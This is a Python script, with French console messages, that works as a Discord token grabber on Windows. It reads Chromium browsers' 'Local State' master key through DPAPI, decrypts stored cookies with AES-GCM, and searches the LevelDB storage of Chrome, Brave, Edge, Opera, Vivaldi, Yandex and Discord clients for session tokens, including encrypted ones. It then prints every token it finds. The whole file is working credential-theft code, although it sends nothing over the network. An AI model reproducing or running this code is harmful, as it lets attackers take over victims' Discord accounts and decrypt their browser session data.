import os
import re
import json
import shutil
import sqlite3
import base64
import tempfile

try:
    import win32crypt
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

TOKEN_REGEX = re.compile(r"[\w-]{24,35}\.[\w-]{6}\.[\w-]{25,110}")
TOKEN_REGEX_ALT = re.compile(r"mfa\.[\w-]{84}")

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")

CHROMIUM_PATHS = {
    "Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Edge": os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
    "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
    "Vivaldi": os.path.join(LOCAL, "Vivaldi", "User Data"),
    "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
    "Chromium": os.path.join(LOCAL, "Chromium", "User Data"),
}

DISCORD_PATHS = {
    "Discord": os.path.join(ROAMING, "discord"),
    "Discord PTB": os.path.join(ROAMING, "discordptb"),
    "Discord Canary": os.path.join(ROAMING, "discordcanary"),
    "Discord Dev": os.path.join(ROAMING, "discorddevelopment"),
}


def get_master_key(folder):
    path = os.path.join(folder, "Local State")
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        if HAS_WIN32:
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        pass
    return None


def decrypt_value(encrypted, master_key):
    try:
        if encrypted[:3] == b"v10" and master_key and HAS_CRYPTO:
            iv = encrypted[3:15]
            payload = encrypted[15:-16]
            tag = encrypted[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(payload, tag).decode("utf-8")
        if HAS_WIN32:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode("utf-8")
    except Exception:
        pass
    return None


def valid_token(token):
    if TOKEN_REGEX_ALT.match(token):
        return True
    parts = token.split(".")
    return len(parts) == 3 and len(token) >= 50


def scan_leveldb(path):
    found = []
    if not os.path.isdir(path):
        return found
    for fname in os.listdir(path):
        if not fname.endswith((".ldb", ".log")):
            continue
        try:
            with open(os.path.join(path, fname), "rb") as f:
                text = f.read().decode("utf-8", errors="ignore")
            found.extend(TOKEN_REGEX.findall(text))
            found.extend(TOKEN_REGEX_ALT.findall(text))
        except Exception:
            pass
    return found


def scan_profile(profile_path, master_key):
    tokens = []
    tokens.extend(scan_leveldb(os.path.join(profile_path, "Local Storage", "leveldb")))

    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db):
        cookies_db = os.path.join(profile_path, "Cookies")

    if os.path.exists(cookies_db):
        try:
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(cookies_db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute(
                "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%'"
            )
            for (encrypted,) in cur.fetchall():
                if encrypted:
                    dec = decrypt_value(encrypted, master_key)
                    if dec:
                        tokens.extend(TOKEN_REGEX.findall(dec))
            conn.close()
            os.remove(tmp)
        except Exception:
            pass
    return tokens


def scan_browsers():
    results = []
    for name, user_data in CHROMIUM_PATHS.items():
        if not os.path.isdir(user_data):
            continue
        master_key = get_master_key(user_data)
        profiles = ["Default"] + [
            d for d in os.listdir(user_data)
            if d.startswith("Profile ") and os.path.isdir(os.path.join(user_data, d))
        ]
        for profile in profiles:
            profile_path = os.path.join(user_data, profile)
            if not os.path.isdir(profile_path):
                continue
            for token in set(scan_profile(profile_path, master_key)):
                if valid_token(token):
                    results.append({"token": token, "source": name, "profile": profile})
    return results


def scan_discord():
    results = []
    for name, discord_dir in DISCORD_PATHS.items():
        leveldb = os.path.join(discord_dir, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb):
            continue
        master_key = get_master_key(discord_dir)

        for token in set(scan_leveldb(leveldb)):
            if valid_token(token):
                results.append({"token": token, "source": name, "profile": "App"})

        if master_key and HAS_CRYPTO:
            try:
                for fname in os.listdir(leveldb):
                    if not fname.endswith((".ldb", ".log")):
                        continue
                    with open(os.path.join(leveldb, fname), "r", errors="ignore") as f:
                        for line in f:
                            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                try:
                                    enc = base64.b64decode(match.split("dQw4w9WgXcQ:")[1])
                                    dec = decrypt_value(enc, master_key)
                                    if dec and valid_token(dec):
                                        results.append({"token": dec, "source": name, "profile": "App"})
                                except Exception:
                                    pass
            except Exception:
                pass
    return results


def scan_all():
    seen = set()
    out = []
    for item in scan_browsers() + scan_discord():
        if item["token"] not in seen:
            seen.add(item["token"])
            out.append(item)
    return out


if __name__ == "__main__":
    print("Scan en cours...\n")
    tokens = scan_all()

    if not tokens:
        print("Aucun token trouvé.")
    else:
        for i, t in enumerate(tokens, 1):
            print(f"--- [{i}] {t['source']} ({t['profile']}) ---")
            print(t["token"])
            print()
